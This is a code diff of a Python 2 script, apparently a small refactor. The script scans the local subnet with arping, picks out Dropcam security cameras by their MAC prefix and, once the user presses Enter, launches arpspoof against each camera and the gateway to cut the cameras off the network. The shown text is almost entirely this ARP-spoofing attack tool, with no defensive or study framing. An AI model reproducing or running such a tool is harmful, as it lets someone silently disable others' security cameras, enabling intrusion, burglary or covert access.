@@ -5,7 +5,6 @@ from subprocess import Popen
 from time import sleep
 from pprint import pprint
 
-dropcams = []
 spoofProcesses = []
 
 def sigterm_handler(_signo, _stack_frame):
@@ -29,13 +28,14 @@ def allIps(addr, netmask, ifname, gateway):
     cidr = str(ipv4.netmask2prefix(netmask))
     print "Current Network: " + addr + "/" + cidr
     network = IPNetwork(str(addr) + "/" + cidr)
-    X = '([a-fA-F0-9]{2}[:|\-]?){6}' # MAC matching regex
+    macRegex = '([a-fA-F0-9]{2}[:|\-]?){6}' # MAC matching regex
     print "---FINDING DROPCAMS ON NETWORK---"
+    dropcams = []
     for host in list(network):
         output = commands.getstatusoutput('arping -c 1 -W 0.3 ' + str(host))
-        a = re.compile(X).search(output[1])
-        if a:
-            mac = output[1][a.start(): a.end()]
+        results = re.compile(macRegex).search(output[1])
+        if results:
+            mac = output[1][results.start(): results.end()]
             dropcam = ""
             if (mac.find("30:8c:fb") == 0):
                 dropcam = " - DROPCAM"
@@ -43,11 +43,11 @@ def allIps(addr, netmask, ifname, gateway):
             print "Found MAC " + mac + " at IP " + str(host) + dropcam
     if len(dropcams) > 0:
         raw_input("---PRESS ENTER TO DISABLE CAMERAS---")
-        startSpoofing(ifname, gateway)
+        startSpoofing(ifname, gateway, dropcams)
     else:
         print "---NO DROPCAMS FOUND ON NETWORK---"
 
-def startSpoofing(ifname, gateway):
+def startSpoofing(ifname, gateway, dropcams):
     print "---SENDING DROPCAMS FALSE ARP INFORMATION---"
     for dropcam in dropcams:
         args = ["arpspoof", "-i", ifname, "-t", dropcam, gateway]
